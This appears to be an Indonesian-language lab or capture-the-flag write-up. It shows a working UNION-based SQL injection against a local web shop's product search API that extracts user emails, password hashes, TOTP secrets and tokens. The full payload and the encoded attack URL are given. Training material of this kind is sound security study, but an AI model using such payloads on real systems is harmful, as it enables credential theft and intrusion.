# Tantangan: User Credentials

Dalam tantangan ini, saya ditugaskan untuk mengekstrak seluruh daftar kredensial pengguna, termasuk alamat email dan hash kata sandi.

### Vektor Serangan
Vektor serangan utama diidentifikasi pada *endpoint* API yang melayani fitur pencarian produk.

### Perancangan Muatan Eksfiltrasi Data

Muatan yang berhasil saya gunakan adalah sebagai berikut:
```sql
x')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--
```
**Rincian Muatan:**
*   **`x'))`**: Bagian ini berfungsi untuk menutup sintaksis dari kueri pencarian produk yang asli secara paksa namun tetap valid.
*   **`UNION SELECT ... FROM Users`**: Perintah ini menyisipkan kueri baru yang secara spesifik mengambil 9 kolom data dari tabel `Users`.
*   **`--`**: Karakter ini berfungsi sebagai penanda komentar SQL, yang secara efektif menonaktifkan sisa kueri asli yang tidak lagi relevan

### Langkah Serangan
Saya kemudian menggabungkan muatan yang telah dirancang ke dalam URL target. Setelah melalui proses *URL encoding* agar dapat ditransmisikan dengan benar, URL final yang digunakan untuk melancarkan serangan adalah:
```http
http://127.0.0.1:3000/rest/products/search?q=x'))%20UNION%20SELECT%20id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive%20FROM%20Users--
```

### Kesimpulan
Serangan *SQL Injection* ini berhasil dieksekusi karena tidak adanya proses validasi atau sanitasi yang memadai terhadap input pengguna pada fitur pencarian.
<img width="934" height="659" alt="image" src="https://github.com/user-attachments/assets/f9a86102-a15f-4ec2-a6f3-0cbf71a0c86e" />
<img width="1194" height="669" alt="image" src="https://github.com/user-attachments/assets/df939f54-8cfb-4f04-860f-a7b04f6062ff" />
